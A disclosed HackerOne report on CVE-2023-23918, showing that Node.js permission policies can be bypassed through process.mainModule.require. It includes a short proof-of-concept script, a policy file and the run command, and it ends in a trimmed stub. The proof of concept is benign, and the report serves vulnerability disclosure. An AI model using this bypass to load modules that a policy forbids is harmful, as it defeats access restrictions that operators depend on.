# [H] Permissions policies can be bypassed via process.mainModule

## Summary
Severity: High (CVSS 7.1)
Program: Node.js
Weakness: Privilege Escalation
Reporter: goums
State: resolved
Disclosed: 2023-03-19T17:12:01.356Z
CVE: CVE-2023-23918
Source: https://hackerone.com/reports/1747642

## Details
**Summary:** 
Permissions policies module can be bypassed via `process.mainModule.require`

**Description:**
Permission policies allow to run a script with a specific set of authorized node js built-in modules.
However, the script could access non authorized modules by calling `process.mainModule.require()`

## Steps To Reproduce:

  1. Create `escape.js` file:
```
console.log(process.mainModule.require("os").cpus());
```
  2. Create `policy.json` file:
```
{
  "onerror": "exit",
  "scopes": {
    "file:": {
      "integrity": true,
      "dependencies": {}
    }
  }
}
```

  3. Run:
```
node --experimental-policy=policy.json escape.js
```
4. You will see your os cpus listed in the console even though the `escape.js` file does not have the permission to import the node`os` module

## Impact: 
Permission policies are supposed to enforce imported modules to a limited whitelist.
This vulnerability allow a script to include any non-whitelisted module.

If you modify `escape.js` to use top level `require` statement, like this:
```
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/1747642_
